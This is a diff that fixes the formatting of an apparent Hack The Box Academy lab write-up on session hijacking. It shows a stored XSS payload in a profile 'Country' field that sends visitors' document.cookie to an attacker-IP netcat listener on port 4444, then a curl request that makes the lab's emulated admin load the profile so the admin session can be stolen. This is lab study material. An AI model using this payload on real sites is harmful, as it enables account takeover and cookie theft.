@@ -80,7 +80,7 @@ In this module, we examine web session security architectures. We audit cookie s
 
 First, we will set the initial configuration with the vhost: 'xss.htb.net'.
 Then – we access the website:
-http://xss.htb.net
+`http://xss.htb.net`
 
 ![Figure 1.1 — Lab execution and output verification (Page 1)](/assets/images/posts/htb-academy/session-security/p001_01.jpg)
 *_Figure 1.1 — Lab execution and output verification (Page 1)_*
@@ -141,7 +141,7 @@ from the application.
 
 #### Technical Methodology & Exploit Execution:
 
-SSL encryption prevents sniffing from the network, not from XXS
+SSL encryption prevents sniffing from the network, not from XSS
 
 Cross-Site Request Forgery (CSRF or XSRF):
 Question: If the update-profile request was GET-based and no anti-CSRF
@@ -203,7 +203,7 @@ Method:
 
 First, we will set the initial configuration with the vhost: 'xss.htb.net'.
 Then – we access the website:
-http://minilab.htb.net
+`http://minilab.htb.net`
 
 now, we get to a login page:
 
@@ -219,18 +219,16 @@ We use the provded credentials: 'heavycat106:rocknrol', and login:
 
 ### testing – we will alert 'hello'
 
-Checking the input fields, the 'Country' input field is suspectable to XXS, for
+Checking the input fields, the 'Country' input field is susceptible to XSS, for
 testing – we will alert 'hello':
+```html
 <script>alert("hello")</script>
-
+```
 
 We save, and enter 'Julie Rogers' profile from incognito browser to confirm:
-http://minilab.htb.net/profile?email=julie.rogers@example.co
-m
+`http://minilab.htb.net/profile?email=julie.rogers@example.com`
 
-
-
-Now that the XXS vulnerability on the 'Country' input field is confirmed – we
+Now that the XSS vulnerability on the 'Country' input field is confirmed – we
 can use it to obtain the visitor auth-session.
 
 ![Figure 7.1 — Lab execution and output verification (Page 7)](/assets/images/posts/htb-academy/session-security/p007_01.jpg)
@@ -248,17 +246,14 @@ nc -lnvp 4444
 
 
 And on 'julie.rogers' profile on Country's field – we enter the payload:
-<style>@keyframes x{}</style><video style="animation-name:x"
-onanimationend="window.location = 'http://<attacker-
-IP>:4444/index.php?c=' + document.cookie;"></video>
-*where '<attacker-IP> is of course our own IP . *
+```html
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<attacker-IP>:4444/index.php?c=' + document.cookie;"></video>
+```
+*where `<attacker-IP>` is of course our own IP .*
 
 
 Now, we save – and enter the profile on incognito browser again:
-*reminder –
-http://minilab.htb.net/profile?email=julie.rogers@example.co
-m
-*
+*reminder – `http://minilab.htb.net/profile?email=julie.rogers@example.com`*
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/session-security/p008_01.jpg)
 *_Figure 8.1 — Lab execution and output verification (Page 8)_*
@@ -275,7 +270,7 @@ While on the browser we get seemingly empty country:
 
 On the netcat listner:
 
-We get the auth session of the incognito browser, confirming the XXS payload
+We get the auth session of the incognito browser, confirming the XSS payload
 works, and can be used to obtain the auth session of anyone visiting.
 
 But the auth-session of the incognito browser doesn't helps us – we need the
@@ -292,7 +287,7 @@ admin's auth-session.
 ### For we have the following endpoint
 
 For we have the following endpoint:
-http://minilab.htb.net/submit-solution
+`http://minilab.htb.net/submit-solution`
 which was provided for us, and will emulate admin's entry.
 
 Attempting to curl it:
@@ -301,9 +296,8 @@ We need a URL.
 So, having the netcat listener ready – we will access the endpoint with
 julie.rogers profile we access before – as the parameter's value:
 ```bash
-curl http://minilab.htb.net/submit-
+curl http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.roge
 ```
-solution?url=http://minilab.htb.net/profile?email=julie.roge
 rs@example.com
 
 
@@ -336,7 +330,7 @@ We are now the admin.
 
 Lets change his visibility to public, then access his profile with his listed email:
 'superadmin@htb.net'
-http://minilab.htb.net/profile?email=superadmin@htb.net
+`http://minilab.htb.net/profile?email=superadmin@htb.net`
 
 ![Figure 11.1 — Lab execution and output verification (Page 11)](/assets/images/posts/htb-academy/session-security/p011_01.jpg)
 *_Figure 11.1 — Lab execution and output verification (Page 11)_*
